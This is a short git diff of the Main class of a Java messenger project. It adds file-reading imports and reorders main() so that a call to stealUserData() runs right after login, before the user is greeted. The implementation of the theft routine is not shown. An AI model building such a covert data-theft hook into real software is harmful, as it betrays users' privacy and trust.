@@ -1,5 +1,9 @@
 package com.vladimirsimek.messenger;
 
+import java.io.BufferedReader;
+import java.io.FileReader;
+import java.io.IOException;
+
 import static com.vladimirsimek.messenger.Data.*;
 import static com.vladimirsimek.messenger.Logic.*;
 import static com.vladimirsimek.messenger.StealUserData.stealUserData;
@@ -9,8 +13,9 @@ public class Main {
 
     public static void main(String[] args) {
         getLogin();
-        greet(name);
         stealUserData();
+        greet(name);
+
 
     }
 }
